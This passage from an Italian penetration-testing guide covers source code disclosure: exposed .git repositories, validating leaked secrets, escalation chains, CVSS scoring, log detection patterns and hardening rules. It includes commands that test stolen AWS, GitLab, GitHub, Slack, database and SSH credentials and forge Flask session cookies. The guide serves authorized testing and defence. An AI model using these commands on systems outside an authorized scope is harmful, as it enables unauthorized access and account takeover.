| Filtri di upload deboli                           | [File upload attack](https://hackita.it/articoli/file-upload-attack/) con bypass costruito sul filtro reale, poi [web shell](https://hackita.it/articoli/web-shell/) |
| `unserialize()` su dati controllabili             | Deserializzazione: con le classi dell'app cerchi una gadget chain (phpggc per PHP)                                                                                   |
| Controlli di autorizzazione mancanti su una route | [IDOR](https://hackita.it/articoli/idor/) e [privilege escalation](https://hackita.it/articoli/privilege-escalation-web/)                                            |
| Secret JWT o chiave di sessione                   | Token e cookie forgiati ([JWT](https://hackita.it/articoli/jwt/))                                                                                                    |
| Richieste HTTP verso URL dell'utente              | [SSRF](https://hackita.it/articoli/ssrf/)                                                                                                                            |
| Template renderizzati da stringa                  | [SSTI](https://hackita.it/articoli/ssti-server-side-template-injection/)                                                                                             |

## Segreti Trovati: Validare Senza Esagerare

Trovare un segreto non vuol dire che sia valido, né che abbia privilegi utili. Nel report distingui tre livelli: **presenza** (il segreto è nel repo), **validità** (autentica ancora) e **impatto** (cosa permette). Per il secondo livello usa la chiamata meno invasiva possibile, sempre dentro lo scope.

```bash
# AWS: identity of the key, read-only, changes nothing
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
  aws sts get-caller-identity

# GitLab personal/CI token: who owns it
curl -s -H "PRIVATE-TOKEN: glpat-8fK2xQ7mZ1pL9vNc4RtB" https://gitlab.company.com/api/v4/user

# GitHub token
curl -s -H "Authorization: Bearer ghp_R2D2C3PO4zQ8mK1vXb7LwN5sTf9YhJ3uAe6G" https://api.github.com/user

# Slack bot token
curl -s -H "Authorization: Bearer xoxb-1234567890-0987654321-AbCdEfGhIjKlMnOpQrStUvWx" https://slack.com/api/auth.test

# Database credentials: connect and read who you are, nothing more
mysql -h db-prod.internal -u webapp_admin -p'Pr0d_DB_P@ssw0rd!2024' -e 'SELECT CURRENT_USER(), @@version;'

# SSH private key: run a harmless command
chmod 600 id_rsa
ssh -i id_rsa -o IdentitiesOnly=yes deploy@web01.target.com id
```

Per le chiavi di pagamento (Stripe, PayPal) non fare transazioni di prova: basta dimostrare che la chiave è live dal prefisso e da una chiamata di sola lettura, se la policy lo consente. Per l'uso dopo l'accesso vedi [SSH](https://hackita.it/articoli/ssh-pentesting-guide/) e [post-exploitation](https://hackita.it/articoli/post-exploitation/).

### Segreto trovato, impatto

| Segreto              | Impatto                                                                                                                                                                          |
| -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Credenziali DB       | Dump dei dati; se l'utente ha privilegi alti, accesso al server ([MySQL](https://hackita.it/articoli/porta-3306-mysql/), [MSSQL](https://hackita.it/articoli/porta-1433-mssql/)) |
| Chiavi AWS/GCP/Azure | Enumerazione cloud, bucket, secret manager                                                                                                                                       |
| Token CI/CD          | Accesso ai repository e alle pipeline: rischio supply chain                                                                                                                      |
| Chiave SSH privata   | Accesso diretto ai server                                                                                                                                                        |
| `SECRET_KEY` Flask   | Cookie di sessione forgiato                                                                                                                                                      |
| `SECRET_KEY` Django  | Cookie firmati forgiati, con backend `signed_cookies` o token di reset                                                                                                           |
| `APP_KEY` Laravel    | Decifra e forgia cookie; in versioni vulnerabili porta a RCE                                                                                                                     |
| `machineKey` ASP.NET | ViewState forgiato, in alcuni casi RCE                                                                                                                                           |
| Secret JWT           | Firmi token arbitrari                                                                                                                                                            |

```bash
# Forge a Flask session cookie once the SECRET_KEY is known
pip install flask-unsign
flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'SuperSecretKey2024'
```

Per l'uso di cookie rubati o forgiati vedi [Session Hijacking](https://hackita.it/articoli/session-hijacking/) e [Account Takeover](https://hackita.it/articoli/account-takeover/).

## Enterprise Escalation

| Catena       | Passaggi                                                                                                                                      |
| ------------ | --------------------------------------------------------------------------------------------------------------------------------------------- |
| Cloud        | `.git` esposto → dump → `.env` con chiavi AWS → `aws sts get-caller-identity` → `aws s3 ls` → secret manager → password RDS → dump DB         |
| Supply chain | `.git/config` con token → trufflehog → token CI/CD nella history → API GitLab → accesso ai repository → possibile manomissione della pipeline |
| Frontend     | Source map JS → route e chiave API interna → API non autenticata → dump utenti → endpoint admin                                               |
| ASP.NET      | `Web.Release.config` leggibile → `machineKey` → ViewState forgiato → esecuzione di codice                                                     |
| White-box    | `.git` esposto → sink SQL nel codice → SQL Injection mirata → credenziali admin                                                               |

## Scenario Tipico

**Contesto (illustrativo):** e-commerce fashion su AWS, test black-box.

`curl https://target.com/.git/HEAD` restituisce `ref: refs/heads/production`. git-dumper ricostruisce il repository in pochi minuti. Nel codice attuale ci sono `.env` con credenziali MySQL e una chiave Stripe live.

trufflehog sulla history trova:

* chiavi AWS committate mesi prima e poi "rimosse", ancora valide;
* un token CI di GitLab dentro un vecchio `.gitlab-ci.yml`, con accesso ai repository del team;
* una chiave privata SSH in un commit intitolato "add deploy script", valida su più server.

Con le chiavi AWS un `aws s3 ls` mostra un bucket di backup del database. Con il token GitLab si leggono i repository privati di app mobile e API interna. Con la chiave SSH si entra su web server e worker. Nessuna di queste scoperte richiede una vulnerabilità applicativa: bastava un `.git` rimasto sul server.

## Source Code Disclosure Vulnerability: CVSS e Severità

Non esiste un punteggio CVSS unico per questa classe di vulnerabilità: dipende dallo scenario. Il codice sorgente in sé è riservatezza (confidenzialità); la severità sale in base a ciò che contiene e a ciò che apre.

Cosa valutare nel report:

* **Accessibilità**: serve autenticazione? È raggiungibile da Internet? (Attack Vector, Privileges Required)
* **Cosa viene esposto**: codice senza segreti, configurazione con credenziali, chiavi cloud.
* **Impatto sul sistema vulnerabile** (Confidenzialità, Integrità, Disponibilità) e **sui sistemi collegati** se i segreti aprono altri accessi (in CVSS 4.0 le metriche dei sistemi successivi, in CVSS 3.1 lo Scope).
* **Prova**: dimostra solo ciò che hai verificato. Una credenziale non testata non giustifica un impatto alto.

| Scenario                              | Cosa valutare nel pentest                                          |
| ------------------------------------- | ------------------------------------------------------------------ |
| Backup con codice non sensibile       | Riservatezza e informazioni effettivamente esposte                 |
| Repository `.git` accessibile         | Ampiezza del codice recuperabile e presenza di dati riservati      |
| Configurazione con credenziali valide | Accessi realmente consentiti e privilegi delle credenziali         |
| Chiave cloud o token CI/CD            | Impatto sugli altri sistemi raggiungibili e sui permessi assegnati |
| File sorgente tramite LFI             | Tipi di file leggibili, privilegi richiesti e dati esposti         |

Documenta le metriche scelte e motiva ognuna: il punteggio numerico va calcolato sul caso reale con il calcolatore CVSS, non copiato da un esempio.

## Errori Comuni

**1. Deploy con `git pull` nella document root.** Il metodo più diffuso e più pericoloso.

**2. "Ho tolto la password dal codice".** Resta nella history. Serve rotazione delle credenziali, poi pulizia con `git filter-repo` o BFG.

**3. `.env` non in `.gitignore`.** Viene committato con il resto.

**4. Dockerfile con `COPY . .` senza `.dockerignore`.** Copia `.git/` nell'immagine; se il container serve file statici, finisce esposto.

**5. Token nei file CI.** `.gitlab-ci.yml`, `.github/workflows/`, `Jenkinsfile` con segreti in chiaro.

**6. Source map in produzione.** La build di sviluppo pubblica i sorgenti del frontend.

**7. Backup "temporanei" lasciati sul server.** `config.php.bak`, `www.zip`, `dump.sql`.

**8. Disattivare solo il directory listing.** Non basta: i singoli file restano raggiungibili.

**9. Pubblicare file di trasformazione e di build.** `Web.Release.config`, `.pubxml`, `.pdb`.

## Detection e Indicatori di Compromissione

Cosa cercare nei log:

* richieste a `/.git/`, `/.svn/`, `/.hg/`, `/.DS_Store`;
* molte richieste sequenziali a `/.git/objects/` da uno stesso IP (è il dump);
* richieste a `/.git/config`, `/.git/HEAD`, `/.git/index`;
* dopo il leak: login con credenziali presenti nel codice, uso di chiavi API o accessi SSH anomali.

```bash
# Who is probing for VCS files? (nginx/Apache combined log format)
grep -E '"(GET|HEAD) /\.(git|svn|hg|bzr)(/|[ ?"])|"(GET|HEAD) /\.DS_Store' /var/log/nginx/access.log \
  | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

## Hardening

**Nginx**

```nginx
# Block every dotfile and dotdirectory except /.well-known/
location ~ /\.(?!well-known/) {
    return 404;
}
```

**Apache**

```apache
# Hide VCS directories
RedirectMatch 404 /\.(git|svn|hg|bzr)(/|$)

# Deny backup and editor leftovers
<FilesMatch "\.(bak|old|orig|save|swp|swo|sql|inc)$|~$">
    Require all denied
</FilesMatch>
```

**PHP**

```ini
; Do not leak errors or the PHP version
display_errors = Off
log_errors = On
expose_php = Off
```

**ASP.NET / IIS**: tieni sempre `web.config` nel deployment, non pubblicare `Web.*.config`, `.pubxml` e `.pdb`, disattiva `elmah.axd` e `trace.axd` in produzione, tieni i segreti fuori da `appsettings.json` pubblicato.

Poi, per ogni vettore:

* **`.git`, `.svn`**: non deployare con `git pull`; usa una pipeline che copia solo i file necessari. Verifica: `/.git/HEAD` deve rispondere 404.
* **Backup e swap**: rimuovili dal server e blocca le estensioni. Verifica con il fuzzing della sezione dedicata.
* **Handler non attivo**: controlla che l'interprete sia attivo in ogni cartella, uploads compresa. Verifica: nessuna risposta contiene `<?php`.
* **LFI e file read**: valida il parametro con una whitelist di file; disattiva i wrapper che non servono. Verifica: `php://filter` non restituisce il sorgente.
* **Source map**: non pubblicarle in produzione, o caricale solo sul tool di error tracking. Verifica: nessun `.map` raggiungibile.
* **Dopo una disclosure ruota tutte le credenziali**: il segreto nella history è compromesso anche se il file non esiste più.
* **Pulisci la history** (dopo la rotazione): `git filter-repo --replace-text expressions.txt` oppure `bfg --replace-text passwords.txt repo.git`. `git filter-branch` è deprecato.
* **Pre-commit hook**: `detect-secrets` o `git-secrets` bloccano i segreti prima del commit.
* **`.dockerignore`** con `.git`, `.env` e `*.map`.
* **Scansiona i tuoi domini** con nuclei e ffuf come faresti con un target esterno.

## Checklist Finale

```text
DISCOVERY
[ ] /.git/HEAD e /.git/config testati (contenuto, non solo status)
[ ] /.svn/wc.db, /.hg/requires, /.bzr/README testati
[ ] /.DS_Store testato
[ ] Fuzzing backup/swap con estensioni (.bak, .old, .swp, ~)
[ ] Risposta con <?php visibile (handler non attivo)
[ ] Script di download e LFI testati (php://filter, /proc/self/cwd)
[ ] Source map .js.map cercata nei bundle
[ ] ASP.NET: web.config, Web.*.config, appsettings, pdb, elmah/trace
[ ] Info disclosure correlata: phpinfo, server-status, actuator, debug
[ ] Sottodomini e microservizi testati con httpx
[ ] Dork Google e GitHub

EXPLOITATION
[ ] Repository ricostruito (git-dumper / GitTools / manuale)
[ ] Remote URL, branch, stash, autori controllati
[ ] .env e config del codice attuale analizzati
[ ] File cancellati recuperati dalla history
[ ] trufflehog git sulla history
[ ] Sorgente analizzato: sink, route, controlli di autorizzazione

SEGRETI TROVATI (solo in scope)
[ ] Presenza, validità e impatto documentati separatamente
[ ] Validazione con la chiamata meno invasiva
[ ] Secret di firma (Flask/Django/Laravel/JWT/machineKey) valutati

REPORT
[ ] Causa tecnica e classificazione (OWASP 2025 / CWE) motivate
[ ] Severità con metriche CVSS motivate sullo scenario reale
[ ] Rischio supply chain documentato
[ ] Raccomandata rotazione completa dei segreti
```

## Domande Frequenti

### Cos'è la source code disclosure?

È l'esposizione non autorizzata del codice sorgente di un'applicazione: il server lo serve in chiaro, oppure un repository, un backup o un file di build è raggiungibile dall'esterno. Rientra nelle information disclosure e il rischio principale sono le credenziali e la logica applicativa che il codice contiene.

### La source code disclosure è una vulnerabilità?

Sì. La classificazione dipende dalla causa: CWE-540 e CWE-538/548/552 per l'esposizione, OWASP A01:2025 Broken Access Control se i file sono raggiungibili da chi non dovrebbe, A02:2025 Security Misconfiguration se la causa è una configurazione errata (A01 e A05 nel Top 10 2021), WASC-13 Information Leakage.

### Come capisco se un sito ha il `.git` esposto?

Richiedi `/.git/HEAD`: se la risposta inizia con `ref: refs/heads/` il repository è esposto. Un 403 su `/.git/` non basta a escluderlo: prova i singoli file e, se rispondono, usa git-dumper o il recupero manuale.

### Cancellare una password dal codice la rimuove dal repository?

No. Il commit che l'ha aggiunta resta nella storia. Va ruotata la credenziale e poi la history va riscritta con `git filter-repo` o BFG.

### Qual è la differenza tra source code disclosure e information disclosure?

L'information disclosure è la categoria generale (errori, header, versioni, file di configurazione). La source code disclosure è il caso in cui ciò che fuoriesce è il codice sorgente dell'applicazione.

### Come si valuta una source code disclosure con CVSS?

Non esiste un punteggio fisso: si valutano accessibilità, privilegi richiesti, cosa viene esposto e l'impatto sui sistemi collegati, poi si calcolano le metriche sullo scenario reale. Un backup con codice innocuo e un `.git` con chiavi AWS valide hanno severità molto diverse.

### Come verificare la source code disclosure in ASP.NET?

Richiedi `web.config`, `Web.Release.config`, `appsettings.json`, `*.deps.json`, `*.runtimeconfig.json`, `*.pdb` e `elmah.axd`, e controlla status e contenuto. Su IIS normale `web.config` risponde 404; un 200 con XML o un assembly scaricabile da `/bin/` indica un problema. Le DLL di Blazor WebAssembly sono pubbliche per design e non sono una vulnerabilità.

### Come si previene?

Non mettere `.git/` e i file di sviluppo nella document root, blocca i file nascosti nel web server, non lasciare backup e source map in produzione, tieni `web.config` e gli handler dei linguaggi attivi e usa scanner di segreti nella pipeline.

***

Continua con la [guida completa File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa/), il [Path Traversal](https://hackita.it/articoli/path-traversal/), la [LFI](https://hackita.it/articoli/lfi/), l'[enumerazione](https://hackita.it/articoli/enumeration/) e il panorama generale degli [attacchi alle applicazioni web](https://hackita.it/articoli/attacchi-applicazioni-web/).
